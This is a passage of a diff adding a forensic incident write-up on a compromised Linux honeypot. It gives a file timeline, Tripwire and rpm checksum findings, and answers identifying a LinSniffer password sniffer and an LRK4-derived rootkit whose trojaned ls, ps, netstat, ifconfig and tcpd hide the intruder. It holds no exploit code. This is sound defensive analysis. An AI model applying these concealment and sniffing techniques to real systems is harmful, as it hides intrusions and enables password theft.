+                         13 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/ssh-keygen.1 -> ssh-keygen1.1
+                       5824 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/ssh-keygen1.1
+                          6 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man1/ssh.1 -> ssh1.1
+                      38572 mac -rw-r--r-- root     root     /mnt/usr/local/man/man1/ssh1.1
+                          7 mac lrwxrwxrwx root     root     /mnt/usr/local/man/man8/sshd.8 -> sshd1.8
+                      37023 mac -rw-r--r-- root     root     /mnt/usr/local/man/man8/sshd1.8
+Nov 08 00 08:53:33        5 mac -rw-r--r-- root     root     /mnt/var/run/sshd.pid
+Nov 08 00 08:53:40      484 ..c -rw------- root     root     /mnt/etc/ftpaccess
+                        456 ..c -rw------- root     root     /mnt/etc/ftpconversions
+                         39 ..c -rw------- root     root     /mnt/etc/ftpgroups
+                        104 ..c -rw------- root     root     /mnt/etc/ftphosts
+                         79 ..c -rw------- root     root     /mnt/etc/ftpusers
+                         78 ..c -rw-r--r-- root     root     /mnt/etc/logrotate.d/ftpd
+                        314 ..c -rw-r--r-- root     root     /mnt/etc/pam.d/ftp
+                       8928 ..c -rwxr-xr-x bin      bin      /mnt/usr/bin/ftpcount
+                       8928 ..c -rwxr-xr-x bin      bin      /mnt/usr/bin/ftpwho
+                       4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/wu-ftpd-2.6.0
+                     112149 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/CHANGES
+                      11382 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/CONTRIBUTORS
+                       2580 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/ERRATA
+                      28539 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/HOWTO/VIRTUAL.FTP.SUPPORT
+                      18641 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/HOWTO/upload.configuration.HOWTO
+                       3185 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/README
+                       4396 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/TODO
+                        404 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpaccess
+                       1866 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpaccess.heavy
+                        538 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpconversions
+                        137 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpconversions.solaris
+                         37 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpgroups
+                        190 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftphosts
+                        882 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpservers
+                         83 ..c -rw-r--r-- root     root     /mnt/usr/doc/wu-ftpd-2.6.0/examples/ftpusers
+                        701 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/ftpcount.1.gz
+                        702 ..c -rw-r--r-- root     root     /mnt/usr/man/man1/ftpwho.1.gz
+                      14006 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/ftpaccess.5.gz
+                        857 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/ftpconversions.5.gz
+                        815 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/ftphosts.5.gz
+                       1635 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/ftpservers.5.gz
+                       1490 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/xferlog.5.gz
+Nov 08 00 08:53:41     5272 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ftpd.8.gz
+                        846 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ftprestart.8.gz
+                       1583 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/ftpshut.8.gz
+                       1350 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/privatepw.8.gz
+                       7792 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/ckconfig
+                       8112 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/ftprestart
+                      10800 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/ftpshut
+                     162608 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/in.ftpd
+                          7 .ac lrwxrwxrwx bin      bin      /mnt/usr/sbin/in.wuftpd -> in.ftpd
+                      10448 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/privatepw
+                          7 .ac lrwxrwxrwx bin      bin      /mnt/usr/sbin/wu.ftpd -> in.ftpd
+                      10438 ..c -rwxr-xr-x bin      bin      /mnt/usr/sbin/xferstats
+Nov 08 00 08:53:49     2257 .ac -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/nfs
+                       1722 ..c -rwxr-xr-x root     root     /mnt/etc/rc.d/init.d/nfslock
+                       2848 ..c -rwxr-xr-x root     root     /mnt/sbin/rpc.lockd
+                      19888 ..c -rwxr-xr-x root     root     /mnt/sbin/rpc.statd
+                       6960 ..c -rwxr-xr-x root     root     /mnt/sbin/rpcdebug
+                       4096 m.c drwxr-xr-x root     root     /mnt/usr/doc/nfs-utils-0.1.9.1
+                       2397 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/ChangeLog
+                        563 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/INSTALL
+                       1058 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/KNOWNBUGS
+                      10337 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/NEW
+                       2305 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/README
+                        291 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/THANKS
+                       4517 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/TODO
+                       3882 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/index.html
+                       3882 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/nfs.html
+                     186037 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/nfs.ps
+                       2626 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node1.html
+                       3254 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node10.html
+                       4615 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node11.html
+                       3479 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node12.html
+                       2432 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node13.html
+                       6807 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node14.html
+                       7418 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node15.html
+                       8743 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node16.html
+                       2064 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node17.html
+                       2786 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node18.html
+                       2165 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node19.html
+                       2399 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node2.html
+                       1989 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node20.html
+                       2291 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node21.html
+                      13506 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node22.html
+                      13490 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node23.html
+                      15226 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node24.html
+                       2377 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node25.html
+                      15230 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node26.html
+                       2377 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node27.html
+                       2903 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node3.html
+                       3966 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node4.html
+                       2623 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node5.html
+                       4444 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node6.html
+                       4157 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node7.html
+                       3989 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node8.html
+                       2756 ..c -rw-r--r-- root     root     /mnt/usr/doc/nfs-utils-0.1.9.1/node9.html
+                       6244 ..c -rw-r--r-- root     root     /mnt/usr/man/man5/exports.5.gz
+                       2224 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/exportfs.8.gz
+                        376 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/lockd.8.gz
+                       1246 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/mountd.8.gz
+                        702 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nfsd.8.gz
+                        788 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nfsstat.8.gz
+                        341 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nhfsgraph.8.gz
+                        332 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nhfsnums.8.gz
+                        235 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nhfsrun.8.gz
+                       4030 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/nhfsstone.8.gz
+                         10 mac lrwxrwxrwx root     root     /mnt/usr/man/man8/rpc.lockd.8.gz -> lockd.8.gz
+                         11 .ac lrwxrwxrwx root     root     /mnt/usr/man/man8/rpc.mountd.8.gz -> mountd.8.gz
+                          9 .ac lrwxrwxrwx root     root     /mnt/usr/man/man8/rpc.nfsd.8.gz -> nfsd.8.gz
+                         12 .ac lrwxrwxrwx root     root     /mnt/usr/man/man8/rpc.rquotad.8.gz -> rquotad.8.gz
+                         10 .ac lrwxrwxrwx root     root     /mnt/usr/man/man8/rpc.statd.8.gz -> statd.8.gz
+                        476 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/rquotad.8.gz
+                        805 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/showmount.8.gz
+                        718 ..c -rw-r--r-- root     root     /mnt/usr/man/man8/statd.8.gz
+                      25232 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/exportfs
+                       6352 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/nfsstat
+                      18640 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/nhfsstone
+                      36784 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/rpc.mountd
+                       3368 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/rpc.nfsd
+                       9872 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/rpc.rquotad
+                       9104 ..c -rwxr-xr-x root     root     /mnt/usr/sbin/showmount
+                          0 ..c -rw-r--r-- root     root     /mnt/var/lib/nfs/etab
+                          0 ..c -rw-r--r-- root     root     /mnt/var/lib/nfs/rmtab
+                          0 ..c -rw-r--r-- root     root     /mnt/var/lib/nfs/xtab
+Nov 08 00 08:53:50    16384 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/conflictsindex.rpm
+                    1343488 mac -rw-r--r-- root     root     /mnt/var/lib/rpm/fileindex.rpm
+                      16384 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/groupindex.rpm
+                      16384 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/nameindex.rpm
+                    4173832 mac -rw-r--r-- root     root     /mnt/var/lib/rpm/packages.rpm
+                      49152 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/providesindex.rpm
+                      49152 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/requiredby.rpm
+                      16384 m.c -rw-r--r-- root     root     /mnt/var/lib/rpm/triggerindex.rpm
+Nov 08 00 08:54:05        4 mac -rw------- root     root     /mnt/var/lib/nfs/state
+                          0 mac -rw-r--r-- root     root     /mnt/var/lock/subsys/nfslock
+Nov 08 00 08:54:22     6416 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/addr
+                     271188 m.. -rwxr-xr-x root     root     /mnt/usr/local/bin/dig
+Nov 08 00 08:54:23   271188 ..c -rwxr-xr-x root     root     /mnt/usr/local/bin/dig
+                     241744 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/dnsquery
+                     260816 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/host
+Nov 08 00 08:54:24     3296 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/mkservdb
+                     241792 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/nsupdate
+                     263960 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/irpd
+                     525412 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/named
+                       7166 mac -rwxr-xr-x root     root     /mnt/usr/local/sbin/named-bootconf
+                      36960 mac -rwxr-xr-x root     root     /mnt/usr/local/sbin/ndc
+                     525412 mac -rwxr-xr-x root     root     /mnt/usr/sbin/named
+                          5 mac -rw-r--r-- root     root     /mnt/var/run/named.pid
+                          0 mac -rw------- root     root     /mnt/var/run/ndc
+
+[ File containing networks to hide ]
+Nov 08 00 08:55:51       78 m.c -rw-r--r-- root     root     /mnt/usr/libexec/awk/addy.awk
+
+[ Replaced backdoored password files with originals ]
+Nov 08 00 08:55:58      657 m.c -rw-r--r-- root     root     /mnt/etc/passwd
+                        601 m.c -rw-r--r-- root     root     /mnt/etc/shadow
+Nov 08 00 08:56:02     1024 m.c drwxr-xr-x root     root     /mnt/var/log
+                       7974 mac -rw-r--r-- root     root     /mnt/var/log/messages
+                        268 mac -rw-r--r-- root     root     /mnt/var/log/secure
+                          0 mac -rw-r--r-- root     root     /mnt/var/log/xferlog
+
+[ Removes suid bit from binaries.  Possibly to limit visibility to normal users ]
+Nov 08 00 08:56:59    17968 ..c -rwx------ root     root     /mnt/bin/ping
+                      45388 ..c -rwx------ root     tty      /mnt/sbin/dump
+                      67788 ..c -rwx------ root     tty      /mnt/sbin/restore
+                      33288 ..c -rwx------ root     root     /mnt/usr/bin/at
+                      35168 ..c -rwx------ root     root     /mnt/usr/bin/chage
+                      36756 ..c -rwx------ root     root     /mnt/usr/bin/gpasswd
+                       5640 ..c -rwx------ root     root     /mnt/usr/bin/newgrp
+                     531516 ..c -rwx------ root     root     /mnt/usr/bin/sperl5.00503
+                     531516 ..c -rwx------ root     root     /mnt/usr/bin/suidperl
+                      34751 ..c -rwx------ root     root     /mnt/usr/libexec/pt_chown
+                      16488 ..c -rwx------ root     bin      /mnt/usr/sbin/traceroute
+                       5896 ..c -rwx------ root     root     /mnt/usr/sbin/usernetctl
+                         52 mac -rw------- drosen   drosen   /mnt/home/drosen/.bash_history
+
+[ Trojaned sshd records intruder login ]
+                        184 mac -rw-r--r-- root     root     /mnt/var/tmp/nap
+
+[ Restores original inetd configuration ]
+Nov 08 00 09:03:05     3027 m.c -rw-r--r-- root     root     /mnt/etc/inetd.conf
+
+Modified Files found by Tripwire Baseline Comparison
+        /mnt/usr/sbin/lpc
+        /mnt/usr/sbin/lpd
+        /mnt/usr/sbin/lpf
+        /mnt/usr/sbin/pac
+        /mnt/usr/sbin/exportfs
+        /mnt/usr/sbin/showmount
+        /mnt/usr/sbin/in.identd
+        /mnt/usr/sbin/tcpd		(trojan prevents TCP wrappers logging)
+        /mnt/usr/sbin/in.telnetd
+        /mnt/usr/sbin/yppush
+        /mnt/usr/sbin/rpc.yppasswdd
+        /mnt/usr/sbin/rpc.ypxfrd
+        /mnt/usr/sbin/ypserv
+        /mnt/usr/sbin/rpc.mountd
+        /mnt/usr/sbin/rpc.rquotad
+        /mnt/usr/bin/emacs
+        /mnt/usr/bin/lpq
+        /mnt/usr/bin/lpr
+        /mnt/usr/bin/lprm
+        /mnt/usr/bin/lptest
+        /mnt/usr/bin/make
+        /mnt/usr/bin/top		(trojan hides selected processes) 
+        /mnt/usr/bin/screen
+        /mnt/usr/bin/telnet
+        /mnt/sbin/ifconfig		(trojan hides interfaces in promiscious mode)
+        /mnt/sbin/rpc.statd
+        /mnt/bin/ls			(trojan hides selected files)
+        /mnt/bin/netstat		(trojan hides intruder network connections)
+        /mnt/bin/ps			(trojan hides intruder supplied list of process names)
+        /mnt/usr/lib/yp/makedbm
+        /mnt/usr/lib/yp/mknetid
+        /mnt/usr/lib/yp/revnetgroup
+        /mnt/usr/lib/yp/yphelper
+        /mnt/usr/lib/yp/ypxfr
+
+Modified Files (changed MD5) found using 'rpm --root /mnt -Va | grep "^..5."'
+S.5.....   /bin/ls
+S.5....T   /usr/sbin/named
+S.5.....   /bin/netstat
+S.5.....   /sbin/ifconfig
+S.5.....   /bin/ps
+S.5.....   /usr/bin/top
+S.5.....   /usr/sbin/tcpd
+S.5....T   /usr/sbin/in.telnetd
+
+Q4. Was there a sniffer or password harvesting program installed? 
+    If so, where and what files are associated with it?
+
+The toolkit installation continues by starting a network sniffer, specifically LinSniffer.
+LinSniffer is associated with the files tcp.log where it stores captured network traffic,
+sniff.pid for its process id, and sp.pl a log output filter.  The filter helps the attacker
+find interesting information such as passwords sniffed of the wire.  The program 'snif' was
+determined to be LinSniffer by comparing its internal function names with that of LinSniffer
+using 'nm -p' and the fact that sp.pl is made specifically to parse LinSniffer output [2].
+Output from 'strings' also shows an association with the sniff.pid and tcp.log files within
+the program text [3].
+The sniffer log, tcp.log, was empty but had not been accessed since the sniffer was started.
+This may indicate that the intruder had in improperly configured for logging or no
+pertinent network traffic was seen by LinSniffer.
+ 
+-----------------------------------------------------------------------------------------------
+        Nov 08 00 08:52:13     7229 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snif
+                                  5 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/sniff.pid
+                                  0 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/tcp.log
+----------------------------------------------------------------------------------------------- 
+
+Q5. Was there a "rootkit" or other post-concealment trojan horse programs installed on the system? 
+    If so, what operating system programs were replaced and how could you get around them?
+
+    Yes, a rootkit was installed on the system along with exploit tools and a network sniffer.
+    Several strings found in the trojan binaries indicate a rootkit named OZ, but a distribution
+    could not be found under this name.  Some of the tools in the kit also had references from
+    the Linux Rootkit version 4 by Lord Somers indicating OZ is newer and builds on LRK4.
+    For a complete analysis of the tools found in the rootkit see toolkit.txt
+
+Q6. What is publicly known about the source of any programs found on the system? 
+    (e.g., their authors, where source code can be found, what exploits or advisories exist about 
+     them, etc.)
+
+    Yes, a rootkit was installed on the system along with exploit tools and a network sniffer.
+    The disk images analyzed were mounted as read-only and noexec to prevent accidental
+    modification or execution of compromised host files.
+    For a complete list of the tools found and analysis see toolkit.txt. 
+
+Q7. Build a time line of events and provide a detailed analysis of activity on the system, noting
+    sources of supporting or confirming evidence (elsewhere on the system or compared with a
+    known "clean" system of similar configuration.) 
+
+            see evidence.txt
+
+Q8. Provide a report suitable for management or news media (general aspects of the intrusion 
+    without specific identifying data). 
+
+            see summary.txt
+
+Q9. Provide an advisory for use within the home organization (a fictitious university, 
+    "honeyp.edu", in this case, where I hold an honorary Doctorate, by the way) to explain the key
+    aspects of the vulnerability exploited, how to detect and defend against this vulnerability, 
+    and how to determine if other systems were similarly compromised.
+
+            see advisory.txt
+
+Q10. Produce a cost-estimate for this incident using the following guidelines and method: 
+
+	     http://staff.washington.edu/dittrich/misc/faqs/incidentcosts.faq 
+
+     To simplify and to normalize the results, assume that your annual salary is $70,000 and that 
+     there are no user-related costs. (If you work as a team, break out hours by person, but all 
+     members should use the same annual salary. Please also include a brief description of each 
+     investigator's number of years of experience in the fields of system administration, 
+     programming, and security, just to help us compare the number of hours spent with other 
+     entrants). 
+
+             see costs.txt
